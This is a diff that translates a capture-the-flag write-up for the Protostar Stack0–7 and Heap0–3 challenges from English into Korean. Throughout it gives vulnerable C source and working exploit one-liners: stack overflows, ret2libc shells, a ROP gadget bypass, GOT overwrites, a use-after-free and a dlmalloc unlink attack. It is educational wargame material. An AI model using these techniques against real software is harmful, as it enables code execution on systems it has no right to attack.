@@ -15,7 +15,7 @@ authors:
 
 ## Stack0
 
-### Source
+### 소스
 
 ```c
 #include <stdlib.h>
@@ -38,9 +38,9 @@ int main(int argc, char **argv)
 }
 ```
 
-The `gets()` function reads into a 64-byte buffer with no bounds checking. The `modified` variable sits immediately after `buffer` on the stack. Writing more than 64 bytes overwrites `modified`.
+`gets()` 함수는 경계 검사 없이 64바이트 버퍼에 입력을 받는다. `modified` 변수는 스택에서 `buffer` 바로 다음에 위치하므로, 64바이트를 초과해 쓰면 `modified`를 덮어쓸 수 있다.
 
-### Exploit
+### 익스플로잇
 
 ```python
 import os
@@ -59,7 +59,7 @@ print p.communicate(payload)[0]
 
 ## Stack1
 
-### Source
+### 소스
 
 ```c
 #include <stdlib.h>
@@ -87,9 +87,9 @@ int main(int argc, char **argv)
 }
 ```
 
-Input is taken via command-line argument using `strcpy`. The target value for `modified` is `0x61626364` (`"dcba"` in ASCII, little-endian: `"abcd"`).
+입력은 커맨드라인 인자로 `strcpy`를 통해 받는다. `modified`의 목표 값은 `0x61626364`이다. 리틀엔디언으로 저장되므로 `"dcba"` 순서가 아닌 `"abcd"` 순서로 입력해야 한다.
 
-### Exploit
+### 익스플로잇
 
 ```python
 import os
@@ -109,7 +109,7 @@ os.system("./stack1" + " " + payload)
 
 ## Stack2
 
-### Source
+### 소스
 
 ```c
 #include <stdlib.h>
@@ -141,9 +141,9 @@ int main(int argc, char **argv)
 }
 ```
 
-Input is read from the `GREENIE` environment variable. The target value is `0x0d0a0d0a` (CRLF bytes). Since these are non-printable characters, packing them as a little-endian integer is necessary.
+입력을 환경 변수 `GREENIE`에서 읽는다. 목표 값은 `0x0d0a0d0a` (CRLF 바이트)다. 출력 불가능한 문자이므로 리틀엔디언 정수로 패킹해서 넣어야 한다.
 
-### Exploit
+### 익스플로잇
 
 ```python
 from subprocess import Popen, PIPE
@@ -166,7 +166,7 @@ print p.communicate()[0]
 
 ## Stack3
 
-### Source
+### 소스
 
 ```c
 #include <stdlib.h>
@@ -195,9 +195,9 @@ int main(int argc, char **argv)
 }
 ```
 
-A function pointer `fp` is stored on the stack adjacent to `buffer`. Overflowing `buffer` allows overwriting `fp` with the address of `win()`, which then gets called.
+함수 포인터 `fp`가 스택에서 `buffer` 인접 위치에 저장된다. `buffer`를 오버플로해 `fp`를 `win()` 함수의 주소로 덮어쓰면, `fp()`가 호출될 때 `win()`이 실행된다.
 
-### Exploit
+### 익스플로잇
 
 ```python
 import os
@@ -219,7 +219,7 @@ print p.communicate(payload)[0]
 
 ## Stack4
 
-### Source
+### 소스
 
 ```c
 #include <stdlib.h>
@@ -240,9 +240,9 @@ int main(int argc, char **argv)
 }
 ```
 
-Classic return address overwrite. The buffer is 64 bytes, followed by the saved frame pointer (4 bytes), then the saved return address. Overwrite `ret` with the address of `win()`.
+전형적인 리턴 주소 덮어쓰기 문제다. 버퍼가 64바이트이고, 그 뒤에 저장된 프레임 포인터(4바이트), 그리고 저장된 리턴 주소가 따라온다. `ret`를 `win()` 주소로 덮어쓴다.
 
-### Exploit
+### 익스플로잇
 
 ```bash
 (perl -e 'print "A"x64, "B"x4, "C"x4, "\x56\x84\x04\x08"'; cat) | ./stack4
@@ -254,7 +254,7 @@ code flow successfully changed
 
 ## Stack5
 
-### Source
+### 소스
 
 ```c
 #include <stdlib.h>
@@ -270,9 +270,9 @@ int main(int argc, char **argv)
 }
 ```
 
-No win function this time — shellcode execution required. NX is not enabled, so shellcode placed in the buffer can be jumped to directly. The payload overwrites the return address to redirect execution into a `system()` call via ret2libc.
+이번엔 win 함수가 없다. NX가 비활성화되어 있으므로 버퍼에 직접 셸코드를 넣고 실행할 수 있다. ret2libc 방식으로 `system()` 호출을 체인으로 연결해 페이로드를 구성한다.
 
-### Exploit
+### 익스플로잇
 
 ```bash
 (perl -e 'print "A"x72, "\x80\x8d\xe2\xf7", "AAAA", "\x8f\x7b\xf6\xf7"'; cat) | ./stack5
@@ -280,13 +280,13 @@ id
 uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)
 ```
 
-The addresses correspond to `system()` and `/bin/sh` in libc, making this a ret2libc attack.
+해당 주소들은 libc의 `system()`과 `/bin/sh`에 해당하며, 이것이 전형적인 ret2libc 공격이다.
 
 ---
 
 ## Stack6
 
-### Source
+### 소스
 
 ```c
 #include <stdlib.h>
@@ -318,9 +318,9 @@ int main(int argc, char **argv)
 }
 ```
 
-Stack6 blocks return addresses in the `0xbf000000` range (the stack). This prevents jumping directly to shellcode on the stack. The bypass is ret2libc — the return address points to `system()` in libc, which is not in that blocked range.
+Stack6은 `0xbf000000` 범위(스택 영역)의 리턴 주소를 차단한다. 스택에 있는 셸코드로 직접 점프하는 방법을 막는 것이다. 우회 방법은 ret2libc — 리턴 주소를 차단 범위 밖인 libc의 `system()`으로 지정하면 된다.
 
-### Exploit
+### 익스플로잇
 
 ```bash
 (perl -e 'print "A"x76, "\x80\x8d\xe2\xf7", "AAAA", "\x8f\x7b\xf6\xf7"'; cat) | ./stack6
@@ -332,7 +332,7 @@ uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdro
 
 ## Stack7
 
-### Source
+### 소스
 
 ```c
 #include <stdlib.h>
@@ -366,9 +366,9 @@ int main(int argc, char **argv)
 }
 ```
 
-Stack7 blocks addresses starting with `0xb0000000`, which covers both the stack (`0xbf...`) and most libc addresses (`0xb7...`). The solution is to use a ROP gadget in the binary's own `.text` section to pivot into a ret2libc chain. The gadget `ret` can be used to align the chain.
+Stack7은 `0xb0000000`으로 시작하는 주소를 차단한다. 스택(`0xbf...`)뿐 아니라 libc 주소(`0xb7...`)까지 대부분 막혀버린다. 해결책은 바이너리 자체의 `.text` 섹션에 있는 ROP 가젯을 사용해 ret2libc 체인으로 피벗하는 것이다. `0x080485ae`에 있는 `ret` 가젯이 유용하다.
 
-### Exploit
+### 익스플로잇
 
 ```bash
 (perl -e 'print "A"x76, "\xae\x85\x04\x08", "\x80\x8d\xe2\xf7", "AAAA", "\x8f\x7b\xf6\xf7"'; cat) | ./stack7
@@ -379,15 +379,15 @@ id
 uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)
 ```
 
-The `0x080485ae` gadget is a `ret` instruction in the binary text segment, used to pivot past the filter before landing in `system()`.
+`0x080485ae` 가젯은 바이너리 텍스트 세그먼트의 `ret` 명령으로, 필터를 통과한 뒤 `system()`에 착지하기 위해 사용된다.
 
 ---
 
 ## Heap0
 
-A straightforward heap overflow where `strcpy` writes past the allocated chunk boundary into an adjacent structure. Overwriting the function pointer in the adjacent object redirects execution to `winner()`.
+`strcpy`가 할당된 청크 경계를 넘어 인접 구조체에 쓰기 때문에 발생하는 간단한 힙 오버플로다. 인접 객체의 함수 포인터를 덮어써 실행 흐름을 `winner()`로 바꾼다.
 
-### Exploit
+### 익스플로잇
 
 ```bash
 ./heap0 $(perl -e 'print "A"x64, "B"x16, "\xb6\x84\x04\x08"')
@@ -397,7 +397,7 @@ A straightforward heap overflow where `strcpy` writes past the allocated chunk b
 
 ## Heap1
 
-Two heap-allocated structures sit adjacent in memory. Each contains a name pointer and a priority field. The layout in memory:
+두 개의 힙 할당 구조체가 메모리에 인접해 있다. 각각 이름 포인터와 우선순위 필드를 갖는다. 메모리 레이아웃:
 
 ```
 | prev | size | prio | name* |
@@ -407,14 +407,14 @@ i2      | NULL | 0x11 |  2   | addr  |
 name    | NULL | 0x11 |     BBBB     |
 ```
 
-By overflowing `i1->name` with enough bytes, the `name` pointer of `i2` can be overwritten to point to `puts@GOT`. Then writing the address of `winner()` into `i2->name` triggers a GOT overwrite when `puts` is called.
+`i1->name`을 충분히 오버플로하면 `i2`의 `name` 포인터를 `puts@GOT`로 덮어쓸 수 있다. 그런 다음 `i2->name`에 `winner()` 주소를 쓰면, `puts`가 호출될 때 GOT 덮어쓰기가 발동된다.
 
 ```
-strcpy(i1->name, argv[1])  →  A*20 + puts_got  (overwrites i2->name*)
-strcpy(i2->name, argv[2])  →  &winner          (overwrites puts GOT entry)
+strcpy(i1->name, argv[1])  →  A*20 + puts_got  (i2->name* 덮어씀)
+strcpy(i2->name, argv[2])  →  &winner          (puts GOT 엔트리 덮어씀)
 ```
 
-### Exploit
+### 익스플로잇
 
 ```bash
 ./heap1 $(perl -e 'print "A"x20, "\x1c\xa0\x04\x08"') $(perl -e 'print "\xe6\x84\x04\x08"')
@@ -425,7 +425,7 @@ and we have a winner @ 1605236809
 
 ## Heap2
 
-### Source
+### 소스
 
 ```c
 struct auth {
@@ -437,17 +437,62 @@ struct auth *auth;
 char *service;
 ```
 
-The program maintains an `auth` struct and a `service` pointer. When `free(auth)` is called, the memory is returned to the heap allocator but the pointer itself is not cleared (use-after-free). When a new `service` string is allocated with `strdup`, it can land on the same freed chunk if the allocation size matches.
+프로그램은 `auth` 구조체와 `service` 포인터를 관리한다. `free(auth)` 호출 시 메모리가 힙 할당자에 반환되지만 포인터 자체는 초기화되지 않는다(use-after-free). 이후 `strdup`으로 새 `service` 문자열을 할당하면, 할당 크기가 맞을 경우 해제된 같은 청크에 위치할 수 있다.
 
-### Analysis
+### 분석
 
-The exploit sequence:
+```c
+char line[128];
 
-1. `auth AAAA...` — allocate auth struct, fill name field
-2. `service` — allocate service on adjacent chunk
-3. `reset` — free auth (pointer not cleared)
-4. `service` — strdup allocates on the freed auth chunk, overwriting `auth->auth`
-5. `login` — auth->auth is now non-zero, login succeeds
+    while(1) {
+        printf("[ auth = %p, service = %p ]\n", auth, service);
+
+        if(fgets(line, sizeof(line), stdin) == NULL) break;
+```
+
+128바이트 버퍼, fgets로 원하는 만큼 입력 가능
+
+```c
+        if(strncmp(line, "auth ", 5) == 0) {
+            auth = malloc(sizeof(auth));
+            memset(auth, 0, sizeof(auth));
+            if(strlen(line + 5) < 31) {
+                strcpy(auth->name, line + 5);
+            }
+        }
+```
+
+`"auth "` + string을 입력하면 크기만큼 할당하고 memset한다. 길이가 31바이트 미만이면 `auth->name`에 데이터를 복사한다.
+
+```c
+        if(strncmp(line, "reset", 5) == 0) {
+            free(auth);
+        }
+        if(strncmp(line, "service", 6) == 0) {
+            service = strdup(line + 7);
+        }
+```
+
+`reset`이면 auth를 해제하고, `service`이면 service 포인터에 문자열을 덮어쓴다.
+
+```c
+        if(strncmp(line, "login", 5) == 0) {
+            if(auth->auth) {
+                printf("you have logged in already!\n");
+            } else {
+                printf("please enter your password\n");
+            }
+        }
+```
+
+`login` 입력 시 `auth->auth` 값이 있으면 로그인된다. 30바이트만 쓸 수 있는데 어떻게 `auth->auth`에 값을 넣을 수 있을까?
+
+익스플로잇 시퀀스:
+1. `auth AAAA...` — auth 구조체 할당, name 필드 채움
+2. `service` — 인접 청크에 service 할당
+3. `reset` — auth 해제 (포인터는 초기화되지 않음)
+4. `service` — strdup이 해제된 auth 청크에 할당되어 `auth->auth`를 덮어씀
+5. `login` — auth->auth가 0이 아니므로 로그인 성공
 
 ```
 auth AAAAAAAAAAAAAAAAAAAAAAAAA
@@ -470,7 +515,7 @@ you have logged in already!
 
 ## Heap3
 
-### Source
+### 소스
 
 ```c
 void winner()
@@ -498,7 +543,7 @@ int main(int argc, char **argv)
 }
 ```
 
-This challenge demonstrates a classic dlmalloc unlink exploit. The heap layout after allocation:
+이 문제는 전형적인 dlmalloc unlink 익스플로잇을 보여준다. 할당 후 힙 레이아웃:
 
 ```
 0x804c000:  0x00000000  0x00000029  0x41414141  ...
@@ -506,9 +551,9 @@ This challenge demonstrates a classic dlmalloc unlink exploit. The heap layout a
 0x804c050:  ...         0x00000029  0x43434343  ...
 ```
 
-Each chunk has a 8-byte header (`prev_size` + `size`). The `fd` and `bk` pointers (used only when free) follow. By overflowing chunk `c` into the boundary between chunks, a crafted fake chunk triggers the unlink macro during `free()`, writing an arbitrary 4-byte value to an arbitrary address — the classic write-what-where primitive used to overwrite `printf@GOT` with `winner()`.
+각 청크에는 8바이트 헤더(`prev_size` + `size`)가 있다. `fd`와 `bk` 포인터(해제 시에만 사용)가 뒤따른다. 청크 `c`를 넘쳐 청크 경계에 가짜 청크를 심으면, `free()` 도중 unlink 매크로가 발동되어 임의의 4바이트 값을 임의의 주소에 쓰는 write-what-where 프리미티브가 만들어진다. 이를 통해 `printf@GOT`를 `winner()`로 덮어쓴다.
 
-The `malloc_chunk` structure:
+`malloc_chunk` 구조:
 
 ```c
 struct malloc_chunk {
